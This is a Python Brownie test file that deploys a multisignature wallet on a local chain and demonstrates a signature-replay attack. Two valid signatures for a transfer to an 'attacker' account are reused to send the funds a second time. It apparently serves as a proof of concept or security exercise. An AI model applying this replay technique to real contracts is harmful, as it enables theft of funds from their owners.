import pytest
from brownie import accounts, MultiSignatureWallet
from eth_account import Account
from web3 import Web3
from eth_abi.packed import encode_packed
from eth_account.messages import encode_defunct
import web3

def test_deploy():
    web3 = Web3(Web3.HTTPProvider("HTTP://127.0.0.1:8545"))

    whale = accounts[0]

    attacker = accounts.add()
    dep = accounts.add()
    signer2 = accounts.add()

    whale.transfer(dep.address, 10e18)
    
    addrs = []
    addrs.append(dep.address)
    addrs.append(signer2.address)
    test = MultiSignatureWallet.deploy(addrs, {'from': dep.address})
    amount = Web3.toWei(10, 'ether')
    whale.transfer(test.address, 50e18)

    enc = encode_packed(['address', 'uint256'], [attacker.address, amount])
    message =encode_defunct(enc)
    sigx1 = web3.eth.account.sign_message(message, dep.private_key)
    sigx2 = web3.eth.account.sign_message(message, signer2.private_key)


    test.transfer(attacker.address, amount, [(sigx1.v, sigx1.r, sigx1.s), (sigx2.v,sigx2.r,sigx2.s)])
    assert(attacker.balance() == amount)

    print("Hacking Time !!!!")
    # We got on hands the signatures of the above transaction so we emulate below and re-issue the transaction.
    sig={
        'r': sigx1.r,
        's': sigx1.s,
        'v': sigx1.v,
    }

    sig2={
        'r': sigx2.r,
        's': sigx2.s,
        'v': sigx2.v,
    }
    test.transfer(attacker.address, amount, [(sig['v'], sig['r'], sig['s']), (sig2['v'],sig2['r'],sig2['s'])])
    assert(attacker.balance() == amount*2)
